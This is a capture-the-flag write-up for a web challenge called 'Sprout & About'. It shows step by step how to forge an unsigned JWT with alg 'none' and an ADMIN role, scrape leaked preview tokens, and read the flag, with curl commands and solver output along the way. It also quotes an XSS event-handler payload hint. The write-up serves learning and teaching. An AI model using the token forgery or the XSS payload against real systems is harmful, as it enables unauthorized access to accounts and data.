# Sprout & About

| Field | Value |
| --- | --- |
| CTF | z0d1akCTF 2026 Qualifiers |
| Category | Web Exploitation |
| Author | neerajcodz |
| Points | 152 |
| Solves at time of solving | 59 |
| Flag | `zdk{0C3AN_DLviNG_i5_fUN}` |

> The plant shop owners heard JWTs were "industry standard" and immediately
> stopped worrying about security. Find a way into the moderation preview, plant
> a crafted sea specimen, and make the flag bloom.

## Executive Summary

Sprout & About is a Next.js plant-shop application with a simple account system,
a customer nursery catalog, and an admin-only "Tide Desk" used to preview
catalog entries.  The interesting trust boundary is the `sprout_session` cookie:
it is a JWT whose payload contains the user's `role`.

Registering a normal account gives a signed `HS256` JWT with `role: "USER"`.
However, the server accepts an unsigned JWT if the header is changed to
`{"alg":"none"}`.  Forging the same cookie with `role: "ADMIN"` grants access
to `/admin`.

The admin product catalog exposes a second weakness.  Each rendered product row
contains a `previewToken`, and the client-side preview dialog uses it to call:

```text
/api/admin/preview-context?productId=<id>&previewToken=<uuid>
```

That endpoint returns the moderation context as JSON.  When reached with the
forged admin session and a leaked preview token, the context includes
`finalFlag`:

```json
{
  "mode": "moderation",
  "finalFlag": "zdk{0C3AN_DLviNG_i5_fUN}",
  "productId": 1,
  "note": "internal-only"
}
```

The supplied [solver](solve.py) automates the full chain against a live
instancer: register, forge the unsigned admin JWT, scrape a preview token, query
the preview context endpoint, and print the flag.

## Repository Contents

| Path | Purpose |
| --- | --- |
| [`solve.py`](solve.py) | End-to-end exploit using only the Python standard library |
| [`artifacts/session-jwt-decoded.json`](artifacts/session-jwt-decoded.json) | Decoded legitimate `USER` session JWT |
| [`artifacts/unsigned-admin-jwt-decoded.json`](artifacts/unsigned-admin-jwt-decoded.json) | Decoded forged unsigned `ADMIN` JWT |
| [`artifacts/admin-products-evidence.txt`](artifacts/admin-products-evidence.txt) | Admin product page observations and leaked preview tokens |
| [`artifacts/product-preview-dialog-snippet.js`](artifacts/product-preview-dialog-snippet.js) | Readable preview-dialog logic extracted from the client chunk |
| [`artifacts/preview-context-response.json`](artifacts/preview-context-response.json) | Captured flag-bearing preview context response |
| [`artifacts/reproduction-curl.txt`](artifacts/reproduction-curl.txt) | Minimal curl reproduction notes |
| [`artifacts/solver-output.txt`](artifacts/solver-output.txt) | Recorded successful exploit output |

This was an instanced web challenge.  The original solve host was:

```text
https://sprout-about-43e04b91a1cd.chals.z0d1ak.org
```

## 1. Public Reconnaissance

The landing page is server-rendered by Next.js and links to the expected public
routes:

```text
/shop
/login
/register
```

The login and registration forms post directly to API routes:

```html
<form action="/api/auth/login" method="post">
<form action="/api/auth/register" method="post">
```

Submitting invalid data to the registration endpoint leaks the validation rule
in the redirect:

```text
/register?error=Use+a+sproutabout.com+email+and+a+12-character+password
```

So a valid throwaway account can be created with:

```console
$ curl -ksS -i -c cookies.txt -X POST "$BASE/api/auth/register" \
    --data-urlencode 'email=codax1787416451@sproutabout.com' \
    --data-urlencode 'password=Codax1234567'
HTTP/2 307
location: https://0.0.0.0:3000/shop
set-cookie: sprout_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

The redirect target uses the application's internal `0.0.0.0:3000` origin, but
the important part is the `sprout_session` cookie.

## 2. Inspecting the Session JWT

Decoding the cookie shows a normal-looking signed JWT:

```json
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "sub": "3",
    "email": "codax1787416451@sproutabout.com",
    "role": "USER",
    "iat": 1787416452,
    "exp": 1787438052
  }
}
```

Accessing `/admin` with the legitimate cookie redirects to `/shop`, which
confirms that the route is checking authorization rather than merely checking
authentication:

```console
$ curl -ksS -D - -b cookies.txt "$BASE/admin" -o /dev/null
HTTP/2 307
location: /shop
```

At this point the challenge title text about JWTs being "industry standard" is
the main hint: do not assume the verifier enforces the algorithm from the
server side.

## 3. Forging an Unsigned Admin Token

The broken behavior is classic JWT algorithm confusion.  If the token header is
changed to:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

and the payload is changed to an admin identity:

```json
{
  "sub": "1",
  "email": "admin@sprout.local",
  "role": "ADMIN",
  "iat": 1787416623,
  "exp": 1787438223
}
```

the signature segment can be left empty.  The resulting JWT has the form:

```text
base64url(header).base64url(payload).
```

Testing role and algorithm variants showed the verifier was strict about the
role string and loose about the signature:

```text
ADMIN      none  HTTP 200 /admin
ADMIN      None  HTTP 307 /login
ADMIN      NONE  HTTP 307 /login
MODERATOR  none  HTTP 307 /shop
REVIEWER   none  HTTP 307 /shop
USER       none  HTTP 307 /shop
```

That gives full access to the Tide Desk:

```console
$ curl -ksS --cookie "sprout_session=$UNSIGNED_ADMIN_JWT" "$BASE/admin" \
    | grep -o 'href="/admin/[^"]*"' | sort -u
href="/admin/logs"
href="/admin/products"
href="/admin/users"
```

## 4. Finding the Moderation Preview

The admin product page contains the challenge's next pointer:

```text
Product descriptions execute inside the sandboxed moderation preview environment.
Stored HTML Lore
Moderation Action
```

It also includes a very explicit QA note:

```text
Payloads using event handlers (e.g. <img src=x onerror=...>) evaluate reliably
during bot moderation preview checks.
```

So the intended surface is a moderation-preview XSS.  We do not need a blind bot
exfiltration, though, because the same page leaks the preview tokens needed by
the preview endpoint.  In the rendered RSC payload each row contains:

```json
{
  "productId": 1,
  "previewToken": "7421c79a-8dbd-4ec5-8047-b41c437fbe45",
  "name": "Moonlit Kelp"
}
```

The extracted client chunk then reveals exactly how the preview button works:

```js
const endpoint =
  `/api/admin/preview-context?productId=${encodeURIComponent(productId)}` +
  `&previewToken=${encodeURIComponent(previewToken)}`;

const response = await fetch(endpoint, { cache: "no-store" });
const context = await response.json();
window.__soilTelemetry = context;
```

After loading this context, the dialog renders the product description with
`dangerouslySetInnerHTML`.  The event-handler XSS hint is real, but because we
already control an admin session and have the preview token, we can call the
same endpoint directly.

## 5. Reading the Flag

With the unsigned admin cookie and any leaked preview token:

```console
$ curl -ksS --cookie "sprout_session=$UNSIGNED_ADMIN_JWT" \
    "$BASE/api/admin/preview-context?productId=1&previewToken=7421c79a-8dbd-4ec5-8047-b41c437fbe45"
```

The response contains the final flag:

```json
{
  "mode": "moderation",
  "finalFlag": "zdk{0C3AN_DLviNG_i5_fUN}",
  "productId": 1,
  "note": "internal-only"
}
```

## 6. End-to-End Solver

The repository solver performs the same steps automatically:

```console
$ python3 solve.py https://sprout-about-43e04b91a1cd.chals.z0d1ak.org
[+] registered user session: alg=HS256 role=USER
[+] using preview token for product 1: Moonlit Kelp
[+] preview context: {"finalFlag": "zdk{0C3AN_DLviNG_i5_fUN}", "mode": "moderation", "note": "internal-only", "productId": 1}
zdk{0C3AN_DLviNG_i5_fUN}
```

## Root Cause

There are two independent authorization mistakes:

1. The JWT verifier accepts `alg: none`, allowing any visitor to mint an
   unsigned admin session.
2. The admin product page exposes one-time preview tokens in the rendered
   payload, and the preview-context endpoint returns sensitive moderation state
   directly to the browser.

The raw HTML preview/XSS surface is a useful hint and would also expose
`window.__soilTelemetry.finalFlag`, but the JWT flaw collapses the chain into a
direct server-side read.
